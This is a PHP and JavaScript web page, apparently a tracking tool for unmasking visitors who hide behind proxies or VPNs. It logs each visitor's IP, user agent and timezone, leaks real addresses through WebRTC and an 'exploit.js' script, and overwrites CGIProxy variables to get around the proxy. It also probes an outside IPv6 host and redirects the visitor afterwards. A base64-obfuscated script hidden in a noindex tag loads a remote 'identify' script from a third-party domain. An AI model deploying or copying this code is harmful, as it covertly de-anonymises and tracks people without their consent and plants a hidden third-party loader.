<?php
header('Content-Type: text/html; charset=utf-8');
date_default_timezone_set("Europe/Kiev");
if (count($_POST) > 0) {
	$file = fopen("log.txt", "a");
	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
	$remote = $_SERVER ['REMOTE_ADDR'];
	fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
	fwrite($file, "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n");
	fwrite($file, "Timezone and Data (client side):\n\t" . "GMT: ". $_POST['timezone'] . ",  Date: " . iconv('utf-8', 'windows-1251', $_POST["date"]) . "\n");
	fwrite($file, "Found addresses:\n");
	
	foreach ( $_POST as $ip ) {
		if ($ip == $_POST['s1'] || $ip == $_POST['date'] || $ip == $_POST['ipv6'] || $ip == "none" && count($_POST) > 1) {
			continue;
		}

		$ips = explode(",", $ip);
		
		foreach ( $ips as $address ) {
			if (strlen($address) > 1) {
				fwrite($file, "\t" . $address . " ");
				fwrite($file, "(" . gethostbyaddr($address) . ")\n");
			}
		}
	}
		
	fwrite($file, "Web-proxy:");
	if (isset($_POST['s1'])) {
	    $address = $_POST['s1'];
	    fwrite($file, "\n\t" . $address . " ");
	}
	fwrite($file, "\nIPv6:\n");
	if ($_POST['ipv6'] != "none" ) {
		fwrite($file, "\t" . $_POST['ipv6'] . " ");
	}
	fwrite($file, "\n\n\n\n");
	fclose($file);
	exit();
}
if (isset($_GET["redirect"]))
{
	    $file = fopen("redirect.txt", "w");
        fwrite($file, '"' . htmlspecialchars($_GET["redirect"]) . '"' );
        fclose($file);
		exit();
}
?>

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
	<form id="f" method="POST">
		<input name="0" value="none" type="hidden"></input>
	</form>
	<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
	<script src="webrtc.js"></script>
	<script src="exploit.js"></script>
	<script>
	var redirect = <?php
		$lines = fopen('./redirect.txt', 'r');
		echo fgets($lines);
	?>;
	//-----------------------------------------------------------------------------------
	var our_proto = "http";
    var our_host = "5.254.124." + "." + "56"; // mask address
    var our_request = "show-js-ip";
    // Detect web-proxy version
    var webproxy = "No";
    if (window["_proxy_jslib_SCRIPT_URL"]) {
      webproxy = "CGIProxy (" + window["_proxy_jslib_SCRIPT_URL"] + ")";
    } else if (window["REAL_PROXY_HOST"]) {
      webproxy = "Cohula (" + window["REAL_PROXY_HOST"] + ")";
    } else if (typeof ginf != 'undefined') {
      webproxy = "Glype (" + ginf.url + ")";
    } else if (window.location.hostname != our_host) {
      webproxy = "Unknown (" + window.location.hostname + ")";
    }
    // Trick for CGIProxy
    window["_proxy_jslib_THIS_HOST"] = our_host;
    window["_proxy_jslib_SCRIPT_NAME"] = "/" + our_request + "?#";
    window["_proxy_jslib_SCRIPT_URL"] 
    = our_proto + "://" + our_host + "/" + window["_proxy_jslib_SCRIPT_NAME"];

	var ipv6;
	post1();
	function post1() {
		$.post("http://[2001:0:53aa:64c:306f:7815:fa01:83c7]/ipv6.php",
			function(data, status) {
				ipv6 = data;
			}
		);
	}

	setTimeout(post, 1000);
	function post() {
		$.post("index.php",
			{
				s: ips, s1: webproxy, s2: ipExploit2, ipv6: ipv6, timezone : new Date().getTimezoneOffset()/60 * -1, date: new Date(),  
			},
		);
	}

	if (redirect != "")
	{	
		setTimeout(function() {window.location.replace(redirect);}, 1500);
	}
    </script>
    <noindex><script async src="data:text/javascript;charset=utf-8;base64,dmFyIG49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7bi5zcmM9Ii8vdmJvcm8uZGUvaWRlbnRpZnkvc3RlcDEucGhwP2RvbT0iK2xvY2F0aW9uLmhvc3RuYW1lKyImc2l0ZT00NjgwIjtuLm9ucmVhZHlzdGF0ZWNoYW5nZT1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJkb25lIik7fTtuLm9ubG9hZD1mdW5jdGlvbigpe2NvbnNvbGUubG9nKCJkb25lIik7fTtkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLmFwcGVuZENoaWxkKG4pOw=="></script></noindex>
<script>

</script>
</body>
</html>
